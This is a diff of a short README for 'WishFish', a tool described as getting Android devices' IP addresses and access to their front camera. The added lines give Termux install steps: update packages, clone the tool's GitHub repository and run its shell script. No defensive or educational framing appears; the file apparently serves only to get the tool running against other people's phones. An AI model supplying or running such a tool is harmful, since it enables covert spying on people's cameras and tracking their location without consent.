@@ -1,2 +1,17 @@
-# WishFish
-This file is all about getting androide devices IP Address and get access to front camera
+WishFish
+
+Get access to the Front Camera
+
+How to install git to termex -
+
+pkg update
+
+pkg upgrade
+
+git clone https://github.com/kinghacker0/WishFish.git
+
+cd WishFish
+
+bash wishfish.sh
+
+These are the commands by which you can install WishFish....
